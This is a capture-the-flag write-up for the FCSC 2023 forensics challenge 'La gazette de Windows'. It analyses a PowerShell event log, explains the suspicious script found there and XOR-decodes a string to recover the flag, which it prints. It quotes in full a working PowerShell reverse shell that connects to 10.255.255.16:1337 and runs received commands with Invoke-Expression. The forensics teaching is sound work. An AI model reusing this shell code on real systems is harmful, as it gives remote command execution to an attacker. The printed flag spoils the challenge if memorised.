# La gazette de Windows
# Original challenge 🇫🇷
Il semblerait qu'un utilisateur exécute des scripts Powershell suspects sur sa machine. Heureusement cette machine est journalisée et nous avons pu récupérer le journal d'évènements Powershell. Retrouvez ce qui a été envoyé à l'attaquant.
# Translated challenge 🇺🇸
It looks like a user is running suspicious Powershell scripts on their machine. Fortunately this machine is logged and we were able to recover the Powershell event log. Find what was sent to the attacker.
# Solution
We are dealing with an .evtx file, we can use the Windows Event Viewer to explore it.

Search for Windows Event Viewer and open it.

Open the Microsoft-Windows-PowerShell4Operational.evtx file.

![Capture d'écran 2023-05-12 024513](https://github.com/Alabouchsalaheddine/FCSC2023_WRITEUPS/blob/main/screenshots/Screenshot_2023-05-12_024513.png)


We have 9 events of which one is a warning

By exploring these 9 events, we can notice that the user created some script blocks.

The most interesting one is 
```
do {
    Start-Sleep -Seconds 1
     try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}
$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D
$s = ""
for ($i = 0; $i -lt 72; $i++) {
    $s += [char]([int]$l[$i] -bxor $i)
}
WriteToStream $s
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()
```

1- This PowerShell script block creates a TCP client that connects to the IP address '10.255.255.16' on port 1337. It waits in a loop until the connection is successful and once it is, it retrieves a network stream and creates a stream writer to send data to the connected endpoint.

2- The script block also defines a function called "WriteToStream" which takes a string as input and sends it to the connected endpoint.

3- It then creates a byte array and uses a loop to populate it with values derived from the hexadecimal values in the variable "$l". The loop XORs each value with its index to derive the original value, and concatenates these values into a string which is passed to the "WriteToStream" function.

4- The script block then enters another loop, where it waits to read data from the network stream. When data is received, it converts the received bytes into a string, executes the string as a PowerShell command, captures any output, and sends the output back to the connected endpoint using the "WriteToStream" function.

5- Finally, the script block closes the stream writer. This script block could be part of a larger script implementing a remote command shell.

We don't need to have the server at the IP address available to reconstruct what was really sent.

We can skip the connexion part and create on powershell a script block with only the interesting part of the code as the following :
```
$ScriptBlock = {

    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
    function WriteToStream ($String) {
        [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
        $StreamWriter.Write($String + 'SHELL> ')
        $StreamWriter.Flush()
    }
    $l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D
    $s = ""
    for ($i = 0; $i -lt 72; $i++) {
        $s += [char]([int]$l[$i] -bxor $i)
    }
	Write-Output $s
    WriteToStream $s

    $StreamWriter.Close()
}
Invoke-Command -ScriptBlock $ScriptBlock
```
![screenshot](https://github.com/Alabouchsalaheddine/FCSC2023_WRITEUPS/blob/main/screenshots/events_result.png)

After the execution, we have the flag : FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}                                                  
